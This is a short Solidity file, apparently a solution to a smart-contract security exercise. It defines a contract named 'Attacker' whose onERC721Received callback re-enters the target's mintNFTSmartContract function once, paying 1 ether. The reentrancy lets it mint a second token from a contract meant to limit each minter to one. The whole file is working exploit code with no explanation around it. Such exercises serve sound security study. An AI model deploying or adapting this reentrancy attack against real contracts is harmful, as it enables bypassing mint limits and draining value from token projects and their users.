// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IUniqueNFT} from "src/IUniqueNFT.sol";

contract Attacker is IERC721Receiver {
    IUniqueNFT target;
    bool entrant;

    function setUp(IUniqueNFT _target) public {
        target = _target;
        entrant = false;
    }
    
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4 res) {
        operator;
        from;
        tokenId;
        data;
        res = IERC721Receiver.onERC721Received.selector;

        if (entrant)
            return res;

        entrant = true;
        target.mintNFTSmartContract{ value: 1 ether }();
    }
}
